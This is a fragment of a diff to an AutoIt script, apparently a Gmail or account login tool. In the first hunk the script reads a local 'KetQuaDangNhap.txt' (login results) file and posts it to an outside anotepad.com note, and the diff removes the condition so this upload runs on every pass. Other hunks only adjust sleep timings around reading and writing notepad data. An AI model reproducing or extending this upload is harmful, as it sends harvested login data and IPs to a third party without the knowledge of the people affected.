@@ -2069,12 +2069,13 @@ EndFunc
 
 		Next
         Sleep(2000)
-		If $vpsso=1 or $vpsso=6 or $vpsso=11 or $vpsso=16 or $vpsso=21 or $vpsso=26 or $vpsso=31 or $vpsso=36 or $vpsso=41 or $vpsso=46 or $vpsso=51 or $vpsso=56 or $vpsso=61 or $vpsso=66 or $vpsso=71 or $vpsso=76 or $vpsso=81 or $vpsso=86 or $vpsso=91 or $vpsso=99  Then
+	;	If $vpsso=1 or $vpsso=6 or $vpsso=11 or $vpsso=16 or $vpsso=21 or $vpsso=26 or $vpsso=31 or $vpsso=36 or $vpsso=41 or $vpsso=46 or $vpsso=51 or $vpsso=56 or $vpsso=61 or $vpsso=66 or $vpsso=71 or $vpsso=76 or $vpsso=81 or $vpsso=86 or $vpsso=91 or $vpsso=99  Then
 
 			$dataIP=FileRead(@ScriptDir&'\KetQuaDangNhap.txt')
+			Sleep(2000)
 			_postdataIPGmail($dataIP,'https://anotepad.com/note/access/6tfiaiej','https://anotepad.com/notes/6tfiaiej')
 
-		EndIf
+		;EndIf
 
 		Return 	$check4
 
@@ -7329,7 +7330,7 @@ EndFunc
 			Sleep(500)
 
                 _requetanotepad($linkdulieu,'testdata.txt')
-			    Sleep(500)
+			    Sleep(1500)
 				$sodong=_FileCountLines(@ScriptDir&'\testdata.txt')
 				If $sodong<2 Then
 					FileDelete(@ScriptDir&'\testdata.txt')
@@ -7344,7 +7345,7 @@ EndFunc
 
 			;If $sodong>10 Then
 			    FileWriteLine(@ScriptDir&'\testdata.txt',$dataIP)
-			    Sleep(2000)
+			    Sleep(5000)
 			    ;$sodog=_FileCountLines(@ScriptDir&'\testdata.txt')
 			   ; For $i20=1 to $sodog
 				  ;  $IdPass=FileReadLine(@ScriptDir&'\testdata.txt',$i20)
